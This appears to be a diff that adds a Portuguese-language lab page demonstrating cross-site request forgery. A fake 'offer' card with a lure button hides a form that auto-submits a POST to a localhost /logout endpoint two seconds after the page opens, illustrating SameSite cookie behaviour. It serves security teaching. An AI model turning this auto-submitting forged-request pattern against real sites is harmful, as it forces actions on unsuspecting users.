@@ -1,0 +1,30 @@
+<!doctype html>
+<html lang="pt-BR">
+  <head>
+    <meta charset="utf-8">
+    <title>Oferta da Semana</title>
+    <style>
+      body { font-family: system-ui, sans-serif; background: #f4f4f5; display: grid; place-items: center; min-height: 100vh; margin: 0; }
+      .card { background: white; border-radius: 16px; padding: 40px; box-shadow: 0 10px 30px rgba(0,0,0,.1); text-align: center; max-width: 380px; }
+      h1 { font-size: 22px; margin: 0 0 8px; }
+      p { color: #555; font-size: 14px; }
+      button { background: #16a34a; color: white; border: 0; border-radius: 10px; padding: 12px 24px; font-size: 15px; cursor: pointer; }
+    </style>
+  </head>
+  <body>
+    <div class="card">
+      <h1>Parabéns! Você ganhou um desconto 🎉</h1>
+      <p>Esta página é um site malicioso simulando uma "oferta".</p>
+      <p>Ela está tentando deslogar você do laboratório via <code>POST /logout</code>.</p>
+      <p><small>Observação: esta página é <strong>outra origem</strong> (file://), então o cookie só viaja se o SameSite permitir.</small></p>
+      <form id="attack" action="https://localhost:3000/logout" method="post">
+        <button type="submit">Resgatar oferta</button>
+      </form>
+    </div>
+    <script>
+      // Dispara o POST automaticamente 2 segundos após abrir a página.
+      // Se o cookie SameSite=None estiver ativo, a vítima é deslogada sem clicar.
+      setTimeout(() => document.querySelector('#attack').submit(), 2000);
+    </script>
+  </body>
+</html>
